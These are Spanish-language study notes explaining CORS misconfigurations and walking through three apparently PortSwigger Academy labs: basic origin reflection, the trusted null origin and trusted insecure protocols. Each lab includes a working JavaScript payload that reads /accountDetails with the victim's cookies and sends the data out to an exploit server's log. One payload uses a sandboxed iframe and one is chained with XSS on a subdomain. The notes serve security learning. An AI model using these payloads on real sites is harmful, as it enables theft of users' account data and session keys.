-------
### QUE ES?
**CORS (Cross-Origin Resource Sharing)** es un mecanismo de seguridad del navegador que controla qué recursos pueden solicitarse desde un **origen diferente** (dominio, puerto o protocolo distinto).
Por defecto, el navegador aplica la **Same-Origin Policy (SOP)**, que bloquea peticiones entre orígenes distintos para evitar que una web maliciosa lea datos sensibles de otra (cookies, tokens, respuestas JSON, etc.).
CORS permite relajar esa restricción mediante cabeceras HTTP como:
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`
- `Access-Control-Allow-Methods`
- `Access-Control-Allow-Headers`

Si el servidor configura mal estas cabeceras, puede permitir que cualquier dominio acceda a datos sensibles.
#### PASOS: 
- *BUSCAR ACCES-CONTROLS RAROS EN TODO EL HTTP HISTORY*
- *PROBAR A METERLE ORIGIN: HTTPS://EXAMPLE.COM Y VER SI `Access-Control-Allow-Origin:EXAMPLE` EN RESPUESTA*
- *PROBAR A METERLE ORIGIN: NULL Y VER SI `Access-Control-Allow-Origin:NULL` EN RESPUESTA**
- *PROBAR A METERLE ORIGIN: SUBDOMINIO.LAB Y VER SI `Access-Control-Allow-Origin:SUBDOMINIO.LAB` EN RESPUESTA**
### LAB1: CORS VULNERABILITY WITH BASIC ORIGIN REFLECTION
En este lab vemos en el *http history* una request `/accountDetails` con un `Access-Control-Allow-Credentials` lo que nos permite ver el json con las claves y usuario en los logs del server exploit ya que el servidor añade `Access-Control-Allow-Origin: nuestro server` de forma automática.
Para ello: 
`<script>  
`    var req = new XMLHttpRequest();  
`    req.onload = reqListener;  
`    req.open('GET', 'LAB-ID/accountDetails', true);  
`    req.withCredentials = true;  
`    req.send();  
`  
`   function reqListener() {  
`       location = '/log?key=' + this.responseText;  
`   };  
`</script>
Esto hace:
- Crea una petición HTTP desde el navegador.
- Cuando el servidor responda, ejecuta la función `reqListener`.
- Prepara una petición GET al endpoint `/accountDetails` que devuelve datos sensibles.
- Le dice al navegador que Incluya las cookies de sesión del usuario con `req.withCredentials = true;`
- Redirige al navegador a: `/log?key=DATOS_ROBADOS`. Eso refleja los datos en los logs.
### LAB2: CORS VULNERABILITY WITH TRUSTED NULL ORIGIN
En este lab, en el **HTTP history** vemos una request a **`/accountDetails`** que devuelve información sensible.  
El objetivo es conseguir leer esa respuesta **desde un origen distinto**, aprovechando una mala configuración de CORS.
#### ¿Qué pasa?
- El navegador, por la **Same-Origin Policy**, no deja que una web atacante **lea** la respuesta de `https://victima.net/accountDetails`.
- Pero si el servidor configura CORS de forma insegura, puede permitirlo mediante cabeceras como:
    - `Access-Control-Allow-Origin`
    - `Access-Control-Allow-Credentials: true`
Al meter en la cabecera de la request `Origin: null` nos damos cuenta que el servidor por su mala configuración añade `Access-Control-Allow-Origin: null`
Lo que nos permite robar la *API session* desde un iframe sin `allow-same-origin` ya que el origen se setea a null:
`<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
`    var req = new XMLHttpRequest();
`    req.onload = reqListener;
`    req.open('get','LAB-ID/accountDetails',true);
`    req.withCredentials = true;
`    req.send();
`    function reqListener() {
`        location='EXPLOIT-SERVER-ID/log?key='+encodeURIComponent(this.responseText);
`    };
`</script>"></iframe>
Esto hace:
- **`srcdoc="..."`**: mete HTML (y el `<script>`) _dentro_ del iframe sin cargar una URL externa.
- **`sandbox`**: restringe el iframe. Pero le damos permisos concretos:
    - `allow-scripts`: permite ejecutar JavaScript dentro del iframe.
    - `allow-top-navigation`: permite que el script haga `location=...` y redirija el “top” (la página principal), que es como “enviar” datos sin CORS de por medio.
    - `allow-forms`: permite formularios.
- Crea una petición HTTP desde el navegador.
- Cuando el servidor responda, ejecuta la función `reqListener`.
- Prepara una petición GET al endpoint `/accountDetails` que devuelve datos sensibles.
- Le dice al navegador que Incluya las cookies de sesión del usuario con `req.withCredentials = true;`
- redirige el navegador al exploit server con los datos en la query string.
### LAB3: CORS VULNERABILITY WITH TRUSTED INSECURE PROTOCOLS
En este lab, en el **HTTP history** vemos una request a **`/accountDetails`** que devuelve información sensible.
#### ¿Qué pasa?
- El navegador, por la **Same-Origin Policy**, no deja que una web atacante **lea** la respuesta de `https://victima.net/accountDetails`.
- Pero si el servidor configura CORS de forma insegura, puede permitirlo mediante cabeceras como:
    - `Access-Control-Allow-Origin`
    - `Access-Control-Allow-Credentials: true`
Al meter en la cabecera de la request `Origin: http://subdominio.Lab-id` nos damos cuenta que el servidor por su mala configuración añade `Access-Control-Allow-Origin: http://subdominio.lab-id`
Lo que nos permite robar la *API session* junto con un *XSS* que hay en el apartado check products en productid el cual usa un subdominio stock, podemos meter en este codigo javascript para redirigir a la víctima.
`<script>
`    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
`</script>

URL encode por si no funciona de la otra forma:
`<script>
	`document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=%3Cscript%3Evar%20req%3Dnew%20XMLHttpRequest()%3Breq.onload%3Dfunction()%7Blocation%3D%27https%3A%2F%2FYOUR-EXPLOIT-SERVER-ID.exploit-server.net%2Flog%3Fkey%3D%27%2BencodeURIComponent(this.responseText)%3B%7D%3Breq.open(%27GET%27%2C%27https%3A%2F%2FYOUR-LAB-ID.web-security-academy.net%2FaccountDetails%27%2Ctrue)%3Breq.withCredentials%3Dtrue%3Breq.send()%3B%3C%2Fscript%3E&storeId=1";
`</script>